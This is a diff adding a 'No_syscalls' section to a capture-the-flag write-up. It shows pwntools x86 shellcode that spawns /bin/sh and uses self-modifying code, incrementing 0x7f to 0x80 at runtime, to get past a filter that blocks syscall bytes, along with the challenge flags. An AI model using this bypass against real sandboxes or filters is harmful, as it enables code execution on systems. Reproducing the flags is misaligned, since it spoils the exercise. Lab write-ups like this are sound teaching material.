@@ -56,3 +56,45 @@ BASC{0pT1miZin9_5h3llc0d3_iS_n0T_s0_H4rD}
 
 # No_syscalls
 
+```
+Send me any x86 shellcode (up to 42 bytes), which contains no system calls, and I'll execute it (at a random address, in rwx memory).
+```
+
+In order to spawn a shell is necessary to do at least one syscall so it had to be forged anyway in our code. Trying to send a simple shell-code containing syscalls' bytes resulted in
+
+```
+INT 80h is forbidden
+```
+
+So there must have been some byte-checking step that blocked syscalls.
+An approach explained in the slides was 'self-modifying code' that permits to avoid restrictions in some cases.
+So I slightly modified the original shell-code
+
+```python
+    shellcode = pwn.asm(
+    """
+    _start:
+    push 0x68
+    push 0x732f2f2f
+    push 0x6e69622f
+    mov ebx,esp
+    mov ecx,eax
+    mov edx,eax
+    mov al,0xb
+    call _incr
+
+    _incr:
+    pop edi
+    inc byte ptr [edi + 5]
+    .byte 0xcd
+    .byte 0x7f
+	"""
+	)
+```
+
+The trick resides in the 'incr' function where the instead of explicitly writing the 0x80 syscall's byte I wrote 0x7f, which is incremented by one in a second moment, bypassing the pattern checking and successfully bringing out the exploit and granting me the flag
+
+```
+BASC{s4ndb0X1n9_AiNt_3a5y}
+```
+
